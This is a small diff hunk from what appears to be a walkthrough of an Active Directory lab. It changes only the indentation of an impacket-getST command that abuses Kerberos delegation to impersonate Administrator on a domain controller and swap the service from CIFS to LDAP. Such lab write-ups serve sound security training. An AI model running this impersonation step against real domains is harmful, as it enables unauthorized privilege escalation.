@@ -108,7 +108,7 @@ Ok I think we need to re-start.
 Ok so we can use the `CIFS/winterfell.north.sevenkingdoms.local` to request a ST as the administrator. We also need to change from CIFS to LDAP or something else.
 
 ```bash
- impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local \
+  impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local \
       -altservice LDAP/winterfell.north.sevenkingdoms.local \
       -impersonate Administrator \
       north.sevenkingdoms.local/jon.snow \
